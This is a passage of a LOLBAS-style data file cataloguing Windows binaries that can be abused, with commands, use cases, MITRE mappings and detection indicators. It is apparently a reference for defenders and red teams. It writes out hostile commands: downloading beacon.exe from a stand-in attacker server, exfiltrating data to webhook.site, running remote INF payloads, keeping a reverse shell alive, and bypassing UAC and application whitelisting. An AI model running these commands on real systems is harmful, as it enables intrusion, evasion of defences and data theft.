                    "Path": "C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\regasm.exe"
                },
                {
                    "Path": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe"
                },
                {
                    "Path": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe"
                },
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": "regasm.exe executing dll file"}],
            "Resources": [
                {
                    "Link": "https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/"
                },
                {
                    "Link": "https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/"
                },
                {
                    "Link": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1121/T1121.md"
                },
            ],
            "Acknowledgement": [{"Person": "Casey Smith", "Handle": "AT_SYMBOLsubtee"}],
            "pname": "regasm",
        },
        {
            "Name": "Bitsadmin.exe",
            "Description": "Used for managing background intelligent transfer",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "bitsadmin /create 1 bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1",
                    "Description": "Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command from an Alternate data stream, then resume and complete the job.",
                    "Usecase": "Performs execution of specified file in the alternate data stream, can be used as a defensive evasion or persistence technique.",
                    "Category": "ADS",
                    "Privileges": "User",
                    "MitreID": "T1096",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\\data\\playfolder\\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1",
                    "Description": "Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job.",
                    "Usecase": "Download file from Internet",
                    "Category": "Download",
                    "Privileges": "User",
                    "MitreID": "T1105",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset",
                    "Description": "Command for copying cmd.exe to another folder",
                    "Usecase": "Copy file",
                    "Category": "Copy",
                    "Privileges": "User",
                    "MitreID": "T1105",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset",
                    "Description": "One-liner that creates a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job.",
                    "Usecase": "Execute binary file specified. Can be used as a defensive evasion.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\bitsadmin.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\bitsadmin.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [
                {"IOC": "Child process from bitsadmin.exe"},
                {"IOC": "bitsadmin creates new files"},
                {"IOC": "bitsadmin adds data to alternate data stream"},
            ],
            "Resources": [
                {
                    "Link": "https://www.slideshare.net/chrisgates/windows-attacks-at-is-the-new-black-26672679 - slide 53"
                },
                {"Link": "https://www.youtube.com/watch?v=_8xJaaQlpBo"},
                {
                    "Link": "https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f"
                },
            ],
            "Acknowledgement": [
                {"Person": "Rob Fuller", "Handle": "AT_SYMBOLmubix"},
                {"Person": "Chris Gates", "Handle": "AT_SYMBOLcarnal0wnage"},
                {"Person": "Oddvar Moe", "Handle": "AT_SYMBOLoddvarmoe"},
            ],
            "pname": "bitsadmin",
        },
        {
            "Name": "Wsreset.exe",
            "Description": "Used to reset Windows Store settings according to its manifest file",
            "Author": "Oddvar Moe",
            "Created": "2019-03-18",
            "Commands": [
                {
                    "Command": "wsreset.exe",
                    "Description": "During startup, wsreset.exe checks the registry value HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command for the command to run. Binary will be executed as a high-integrity process without a UAC prompt being displayed to the user.",
                    "Usecase": "Execute a binary or script as a high-integrity process without a UAC prompt.",
                    "Category": "UAC bypass",
                    "Privileges": "User",
                    "MitreID": "T1088",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1088",
                    "OperatingSystem": "Windows 10",
                }
            ],
            "Full_Path": [{"Path": "C:\\Windows\\System32\\wsreset.exe"}],
            "Code Sample": [{"Code": None}],
            "Detection": [
                {"IOC": "wsreset.exe launching child process other than mmc.exe"},
                {
                    "IOC": "Creation or modification of the registry value HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command"
                },
                {
                    "IOC": "Microsoft Defender Antivirus as Behavior:Win32/UACBypassExp.T!gen"
                },
            ],
            "Resources": [
                {"Link": "https://www.activecyber.us/activelabs/windows-uac-bypass"},
                {
                    "Link": "https://twitter.com/ihack4falafel/status/1106644790114947073"
                },
                {"Link": "https://github.com/hfiref0x/UACME/blob/master/README.md"},
            ],
            "Acknowledgement": [
                {"Person": "Hashim Jawad", "Handle": "AT_SYMBOLihack4falafel"}
            ],
            "pname": "wsreset",
        },
        {
            "Name": "Scriptrunner.exe",
            "Description": None,
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "Scriptrunner.exe -appvscript calc.exe",
                    "Description": "Executes calc.exe",
                    "Usecase": "Execute binary through proxy binary to evade defensive counter measurments",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": 'ScriptRunner.exe -appvscript "\\\\fileserver\\calc.cmd"',
                    "Description": "Executes calc.cmde from remote server",
                    "Usecase": "Execute binary through proxy binary  from external server to evade defensive counter measurments",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\scriptrunner.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\scriptrunner.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [
                {
                    "IOC": "Scriptrunner.exe should not be in use unless App-v is deployed"
                }
            ],
            "Resources": [
                {"Link": "https://twitter.com/KyleHanslovan/status/914800377580503040"},
                {"Link": "https://twitter.com/NickTyrer/status/914234924655312896"},
                {"Link": "https://github.com/MoooKitty/Code-Execution"},
            ],
            "Acknowledgement": [
                {"Person": "Nick Tyrer", "Handle": "AT_SYMBOLnicktyrer"}
            ],
            "pname": "scriptrunner",
        },
        {
            "Name": "ConfigSecurityPolicy.exe",
            "Description": "Binary part of Windows Defender. Used to manage settings in Windows Defender. you can configure different pilot collections for each of the co-management workloads. Being able to use different pilot collections allows you to take a more granular approach when shifting workloads.",
            "Author": "Ialle Teixeira",
            "Created": "04/09/2020",
            "Commands": [
                {
                    "Command": "ConfigSecurityPolicy.exe C:\\\\Windows\\\\System32\\\\calc.exe https://webhook.site/xxxxxxxxx?encodedfile",
                    "Description": "Upload file, credentials or data exfiltration in general",
                    "Usecase": "Upload file",
                    "Category": "Upload",
                    "Privileges": "User",
                    "MitreID": "T1567",
                    "MitreLink": "https://attack.mitre.org/techniques/T1567/",
                    "OperatingSystem": "Windows 10",
                }
            ],
            "Full_Path": [
                {
                    "Path": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\ConfigSecurityPolicy.exe"
                }
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [
                {
                    "IOC": "ConfigSecurityPolicy storing data into alternate data streams."
                },
                {
                    "IOC": "Preventing/Detecting ConfigSecurityPolicy with non-RFC1918 addresses by Network IPS/IDS."
                },
                {
                    "IOC": "Monitor process creation for non-SYSTEM and non-LOCAL SERVICE accounts launching ConfigSecurityPolicy.exe."
                },
                {
                    "IOC": 'User Agent is "MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)"'
                },
            ],
            "Resources": [
                {
                    "Link": "https://docs.microsoft.com/en-US/mem/configmgr/comanage/how-to-switch-workloads"
                },
                {
                    "Link": "https://docs.microsoft.com/en-US/mem/configmgr/comanage/workloads"
                },
                {
                    "Link": "https://docs.microsoft.com/en-US/mem/configmgr/comanage/how-to-monitor"
                },
                {
                    "Link": "https://twitter.com/NtSetDefault/status/1302589153570365440?s=20"
                },
            ],
            "Acknowledgement": [
                {"Person": "Ialle Teixeira", "Handle": "AT_SYMBOLNtSetDefault"}
            ],
            "pname": "configsecuritypolicy",
        },
        {
            "Name": "Control.exe",
            "Description": "Binary used to launch controlpanel items in Windows",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "control.exe c:\\windows\\tasks\\file.txt:evil.dll",
                    "Description": "Execute evil.dll which is stored in an Alternate Data Stream (ADS).",
                    "Usecase": "Can be used to evade defensive countermeasures or to hide as a persistence mechanism",
                    "Category": "ADS",
                    "Privileges": "User",
                    "MitreID": "T1196",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1196",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                }
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\control.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\control.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [
                {"IOC": "Control.exe executing files from alternate data streams."}
            ],
            "Resources": [
                {
                    "Link": "https://pentestlab.blog/2017/05/24/applocker-bypass-control-panel/"
                },
                {
                    "Link": "https://www.contextis.com/resources/blog/applocker-bypass-registry-key-manipulation/"
                },
                {"Link": "https://twitter.com/bohops/status/955659561008017409"},
                {
                    "Link": "https://docs.microsoft.com/en-us/windows/desktop/shell/executing-control-panel-items"
                },
                {
                    "Link": "https://bohops.com/2018/01/23/loading-alternate-data-stream-ads-dll-cpl-binaries-to-bypass-applocker/"
                },
            ],
            "Acknowledgement": [{"Person": "Jimmy", "Handle": "AT_SYMBOLbohops"}],
            "pname": "control",
        },
        {
            "Name": "Pnputil.exe",
            "Description": "used for Install drivers.",
            "Author": "Hai vaknin (lux)",
            "Created": "25/12/2020",
            "Commands": [
                {
                    "Command": "pnputil.exe -i -a C:\\Users\\hai\\Desktop\\mo.inf",
                    "Description": "used for Install drivers",
                    "Usecase": "add malicious driver.",
                    "Category": "Execute",
                    "Privileges": "Administrator",
                    "MitreID": "T1215",
                    "MitreLink": "https://attack.mitre.org/techniques/T1215",
                    "OperatingSystem": "Windows 10,7",
                }
            ],
            "Full_Path": [{"Path": "C:\\Windows\\system32\\pnputil.exe"}],
            "Code_Sample": "https://github.com/LuxNoBulIshit/test.inf/blob/main/inf",
            "Acknowledgement": [
                {"Person": "Hai Vaknin(Lux)", "Handle": "LuxNoBulIshit"},
                {"Person": "Avihay eldad", "Handle": "aloneliassaf"},
            ],
            "pname": "pnputil",
        },
        {
            "Name": "At.exe",
            "Description": "Schedule periodic tasks",
            "Author": "Freddie Barr-Smith",
            "Created": "2019-09-20",
            "Commands": [
                {
                    "Command": "C:\\Windows\\System32\\at.exe at 09:00 /interactive /every:m,t,w,th,f,s,su C:\\Windows\\System32\\revshell.exe",
                    "Description": "Create a recurring task to execute every day at a specific time.",
                    "Usecase": "Create a recurring task, to eg. to keep reverse shell session(s) alive",
                    "Category": "Execute",
                    "Privileges": "Local Admin",
                    "MitreID": "T1053",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1053",
                    "OperatingSystem": "Windows 7 or older",
                }
            ],
            "Full_Path": [
                {"Path": "C:\\WINDOWS\\System32\\At.exe"},
                {"Path": "C:\\WINDOWS\\SysWOW64\\At.exe"},
            ],
            "Detection": [
                {"IOC": "Scheduled task is created"},
                {"IOC": "Windows event log - type 3 login"},
                {
                    "IOC": "C:\\Windows\\System32\\Tasks\\At1 (substitute 1 with subsequent number of at job)"
                },
                {"IOC": "C:\\Windows\\Tasks\\At1.job"},
                {
                    "IOC": "Registry Key - Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\At1."
                },
            ],
            "Resources": [
                {"Link": "https://freddiebarrsmith.com/at.txt"},
                {
                    "Link": "https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html - Escalate to System from Administrator"
                },
                {
                    "Link": "https://www.secureworks.com/blog/where-you-at-indicators-of-lateral-movement-using-at-exe-on-windows-7-systems"
                },
            ],
            "Acknowledgement": [
                {"Person": "Freddie Barr-Smith", "Handle": None},
                {"Person": "Riccardo Spolaor", "Handle": None},
                {"Person": "Mariano Graziano", "Handle": None},
                {"Person": "Xabier Ugarte-Pedrero", "Handle": None},
            ],
            "pname": "at",
        },
        {
            "Name": "MpCmdRun.exe",
            "Description": "Binary part of Windows Defender. Used to manage settings in Windows Defender",
            "Author": "Oddvar Moe",
            "Created": "09/03/2020",
            "Commands": [
                {
                    "Command": "MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\\\temp\\\\beacon.exe",
                    "Description": "Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path)",
                    "Usecase": "Download file",
                    "Category": "Download",
                    "Privileges": "User",
                    "MitreID": "T1105",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105",
                    "OperatingSystem": "Windows 10",
                },
                {
                    "Command": 'copy "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\MpCmdRun.exe" C:\\Users\\Public\\Downloads\\MP.exe && chdir "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\" && "C:\\Users\\Public\\Downloads\\MP.exe" -DownloadFile -url https://attacker.server/beacon.exe -path C:\\Users\\Public\\Downloads\\evil.exe',
                    "Description": "Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path) [updated version to bypass Windows 10 mitigation]",
                    "Usecase": "Download file",
                    "Category": "Download",
                    "Privileges": "User",
                    "MitreID": "T1105",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105",
                    "OperatingSystem": "Windows 10",
                },
                {
                    "Command": "MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\\\temp\\\\nicefile.txt:evil.exe",
                    "Description": "Download file to machine and store it in Alternate Data Stream",
                    "Usecase": "Hide downloaded data inton an Alternate Data Stream",
                    "Category": "ADS",
                    "Privileges": "User",
                    "MitreID": "T1096",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096",
                    "OperatingSystem": "Windows 10",
                },
            ],
            "Full_Path": [
                {
                    "Path": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.4-0\\MpCmdRun.exe"
                },
                {
                    "Path": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.7-0\\MpCmdRun.exe"
                },
                {
                    "Path": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\MpCmdRun.exe"
                },
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [
                {"IOC": "MpCmdRun storing data into alternate data streams."},
                {
                    "IOC": "MpCmdRun getting a file from a remote machine or the internet that is not expected."
                },
                {
                    "IOC": "Monitor process creation for non-SYSTEM and non-LOCAL SERVICE accounts launching mpcmdrun.exe."
                },
                {
                    "IOC": "Monitor for the creation of %USERPROFILE%\\AppData\\Local\\Temp\\MpCmdRun.log"
                },
                {"IOC": 'User Agent is "MpCommunication"'},
            ],
            "Resources": [
                {
                    "Link": "https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-antivirus/command-line-arguments-microsoft-defender-antivirus"
                },
                {
                    "Link": "https://twitter.com/mohammadaskar2/status/1301263551638761477"
                },
                {"Link": "https://twitter.com/Oddvarmoe/status/1301444858910052352"},
                {"Link": "https://twitter.com/NotMedic/status/1301506813242867720"},
            ],
            "Acknowledgement": [
                {"Person": "Askar", "Handle": "AT_SYMBOLmohammadaskar2"},
                {"Person": "Oddvar Moe", "Handle": "AT_SYMBOLoddvarmoe"},
                {"Person": "RichRumble", "Handle": ""},
                {"Person": "Cedric", "Handle": "AT_SYMBOLth3c3dr1c"},
            ],
            "pname": "mpcmdrun",
        },
        {
            "Name": "Eventvwr.exe",
            "Description": "Displays Windows Event Logs in a GUI window.",
            "Author": "Jacob Gajek",
            "Created": "2018-11-01",
            "Commands": [
                {
                    "Command": "eventvwr.exe",
                    "Description": "During startup, eventvwr.exe checks the registry value HKCU\\Software\\Classes\\mscfile\\shell\\open\\command for the location of mmc.exe, which is used to open the eventvwr.msc saved console file. If the location of another binary or script is added to this registry value, it will be executed as a high-integrity process without a UAC prompt being displayed to the user.",
                    "Usecase": "Execute a binary or script as a high-integrity process without a UAC prompt.",
                    "Category": "UAC bypass",
                    "Privileges": "User",
                    "MitreID": "T1088",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1088",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                }
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\eventvwr.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\eventvwr.exe"},
            ],
            "Code Sample": [
                {
                    "Code": "https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-EventVwrBypass.ps1"
                }
            ],
            "Detection": [
                {"IOC": "eventvwr.exe launching child process other than mmc.exe"},
                {
                    "IOC": "Creation or modification of the registry value HKCU\\Software\\Classes\\mscfile\\shell\\open\\command"
                },
            ],
            "Resources": [
                {
                    "Link": "https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/"
                },
                {
                    "Link": "https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-EventVwrBypass.ps1"
                },
            ],
            "Acknowledgement": [
                {"Person": "Matt Nelson", "Handle": "AT_SYMBOLenigma0x3"},
                {"Person": "Matt Graeber", "Handle": "AT_SYMBOLmattifestation"},
            ],
            "pname": "eventvwr",
        },
        {
            "Name": "Regsvcs.exe",
            "Description": "Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "regsvcs.exe AllTheThingsx64.dll",
                    "Description": "Loads the target .DLL file and executes the RegisterClass function.",
                    "Usecase": "Execute dll file and bypass Application whitelisting",
                    "Category": "Execute",
                    "Privileges": "Local Admin",
                    "MitreID": "T1121",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1121",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "regsvcs.exe AllTheThingsx64.dll",
                    "Description": "Loads the target .DLL file and executes the RegisterClass function.",
                    "Usecase": "Execute dll file and bypass Application whitelisting",
                    "Category": "AWL bypass",
                    "Privileges": "Local Admin",
                    "MitreID": "T1121",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1121",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\regsvcs.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\regsvcs.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {
                    "Link": "https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/"
                },
                {
                    "Link": "https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/"
                },
                {
                    "Link": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1121/T1121.md"
                },
            ],
            "Acknowledgement": [{"Person": "Casey Smith", "Handle": "AT_SYMBOLsubtee"}],
            "pname": "regsvcs",
        },
        {
            "Name": "Cmstp.exe",
            "Description": "Installs or removes a Connection Manager service profile.",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "cmstp.exe /ni /s c:\\cmstp\\CorpVPN.inf",
                    "Description": "Silently installs a specially formatted local .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.",
                    "Usecase": "Execute code hidden within an inf file. Download and run scriptlets from internet.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1191",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1191",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf",
                    "Description": "Silently installs a specially formatted remote .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.",
                    "Usecase": "Execute code hidden within an inf file. Execute code directly from Internet.",
                    "Category": "AwL bypass",
                    "Privileges": "User",
                    "MitreID": "T1191",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1191",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\cmstp.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\cmstp.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [
                {
                    "IOC": "Execution of cmstp.exe should not be normal unless VPN is in use"
                },
                {"IOC": "Cmstp.exe communication towards internet and getting files"},
            ],
            "Resources": [
                {"Link": "https://twitter.com/NickTyrer/status/958450014111633408"},
                {
                    "Link": "https://gist.github.com/NickTyrer/bbd10d20a5bb78f64a9d13f399ea0f80"
                },
                {
                    "Link": "https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e"
                },
                {"Link": "https://oddvar.moe/2017/08/15/research-on-cmstp-exe/"},
                {
                    "Link": "https://gist.githubusercontent.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1/raw/3127ba7453a6f6d294cd422386cae1a5a2791d71/UACBypassCMSTP.ps1"
                },
                {
                    "Link": "https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmstp"
                },
            ],
            "Acknowledgement": [
                {"Person": "Oddvar Moe", "Handle": "AT_SYMBOLoddvarmoe"},
                {"Person": "Nick Tyrer", "Handle": "AT_SYMBOLNickTyrer"},
            ],
            "pname": "cmstp",
        },
        {
            "Name": "Jsc.exe",
            "Description": "Binary file used by .NET to compile javascript code to .exe or .dll format",
            "Author": "Oddvar Moe",
            "Created": "2019-05-31",
            "Commands": [
                {
                    "Command": "jsc.exe scriptfile.js",
                    "Description": "Use jsc.exe to compile javascript code stored in scriptfile.js and output scriptfile.exe.",
                    "Usecase": "Compile attacker code on system. Bypass defensive counter measures.",
                    "Category": "Compile",
                    "Privileges": "User",
                    "MitreID": "T1127",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1127",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "jsc.exe /t:library Library.js",
                    "Description": "Use jsc.exe to compile javascript code stored in Library.js and output Library.dll.",
                    "Usecase": "Compile attacker code on system. Bypass defensive counter measures.",
                    "Category": "Compile",
                    "Privileges": "User",
                    "MitreID": "T1127",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1127",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Jsc.exe"},
                {
                    "Path": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Jsc.exe"
                },
                {"Path": "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\Jsc.exe"},
                {
                    "Path": "C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\Jsc.exe"
                },
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [
                {
                    "IOC": "Jsc.exe should normally not run a system unless it is used for development."
                }
            ],
            "Resources": [
                {
                    "Link": "https://twitter.com/DissectMalware/status/998797808907046913"
                },
                {"Link": "https://www.phpied.com/make-your-javascript-a-windows-exe/"},
            ],
            "Acknowledgement": [
                {"Person": "Malwrologist", "Handle": "AT_SYMBOLDissectMalware"}
            ],
            "pname": "jsc",
        },
        {
            "Name": "Print.exe",
            "Description": "Used by Windows to send files to the printer",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "print /D:C:\\ADS\\File.txt:file.exe C:\\ADS\\File.exe",
                    "Description": "Copy file.exe into the Alternate Data Stream (ADS) of file.txt.",
                    "Usecase": "Hide binary file in alternate data stream to potentially bypass defensive counter measures",
                    "Category": "ADS",
                    "Privileges": "User",
                    "MitreID": "T1096",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "print /D:C:\\ADS\\CopyOfFile.exe C:\\ADS\\FileToCopy.exe",
                    "Description": "Copy FileToCopy.exe to the target C:\\ADS\\CopyOfFile.exe",
                    "Usecase": "Copy files",
                    "Category": "Copy",
                    "Privileges": "User",
                    "MitreID": "T1105",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
                {
                    "Command": "print /D:C:\\OutFolder\\outfile.exe \\\\WebDavServer\\Folder\\File.exe",
                    "Description": "Copy File.exe from a network share to the target c:\\OutFolder\\outfile.exe.",
                    "Usecase": "Copy/Download file from remote server",
                    "Category": "Copy",
                    "Privileges": "User",
                    "MitreID": "T1105",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                },
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\print.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\print.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [
                {"IOC": "Print.exe getting files from internet"},
                {"IOC": "Print.exe creating executable files on disk"},
            ],
            "Resources": [
                {"Link": "https://twitter.com/Oddvarmoe/status/985518877076541440"},
                {
                    "Link": "https://www.youtube.com/watch?v=nPBcSP8M7KE&lc=z22fg1cbdkabdf3x404t1aokgwd2zxasf2j3rbozrswnrk0h00410"
                },
            ],
            "Acknowledgement": [
                {"Person": "Oddvar Moe", "Handle": "AT_SYMBOLoddvarmoe"}
            ],
            "pname": "print",
        },
        {
            "Name": "Infdefaultinstall.exe",
            "Description": "Binary used to perform installation based on content inside inf files",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "InfDefaultInstall.exe Infdefaultinstall.inf",
                    "Description": "Executes SCT script using scrobj.dll from a command in entered into a specially prepared INF file.",
                    "Usecase": "Code execution",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",
                }
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\Infdefaultinstall.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\Infdefaultinstall.exe"},
            ],
            "Code_Sample": [
                {
                    "Code": "https://gist.github.com/KyleHanslovan/5e0f00d331984c1fb5be32c40f3b265a"
                }
            ],
            "Detection": [{"IOC": None}],
            "Resources": [
                {"Link": "https://twitter.com/KyleHanslovan/status/911997635455852544"},
                {
                    "Link": "https://blog.conscioushacker.io/index.php/2017/10/25/evading-microsofts-autoruns/"
                },
            ],
            "Acknowledgement": [
                {"Person": "Kyle Hanslovan", "Handle": "AT_SYMBOLkylehanslovan"}
            ],
            "pname": "infdefaultinstall",
        },
    ],
    "OtherMSBinaries": [
        {
            "Name": "Bginfo.exe",
            "Description": "Background Information Utility included with SysInternals Suite",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "bginfo.exe bginfo.bgi /popup /nolicprompt",
                    "Description": "Execute VBscript code that is referenced within the bginfo.bgi file.",
                    "Usecase": "Local execution of VBScript",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows",
                },
                {
